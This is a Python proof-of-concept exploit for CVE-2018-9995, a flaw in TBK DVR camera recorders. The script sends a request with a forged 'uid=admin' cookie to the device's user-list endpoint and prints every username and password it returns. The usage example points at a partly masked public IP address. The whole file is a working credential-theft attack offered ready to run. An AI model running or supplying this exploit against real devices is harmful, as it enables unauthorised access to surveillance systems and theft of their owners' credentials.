#!/usr/bin/env python3
# CVE-2018-9995 PoC

import requests
import json
import sys

if len(sys.argv) < 2:
    print("""
    CVE-2018-9995_PoC.py
    Get TBK DVR uid and pwd (CVE-2018-9995 PoC)
    usage:
        python3 CVE-2018-9995_PoC.py <URL>
    e.g.
        python3 CVE-2018-9995_PoC.py http://23.126.211.***:85
        """)
else:   
    url = sys.argv[1]
    dvr = url + "/device.rsp?opt=user&cmd=list"
    kv = { "user-agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0", "Cookie" : "uid=admin"}
    try:
        response = requests.get(dvr, headers = kv, timeout = 30)
        response.raise_for_status()
        data = json.loads(response.text)["list"]
        for userinfo in data:
            uid = userinfo["uid"]
            pwd = userinfo["pwd"]
            print("\033[32m[*] uid : {:<10} pwd : {}\033[0m".format(uid, pwd))
    except:
        print("\033[31m[!] HTTP Error!\033[0m")
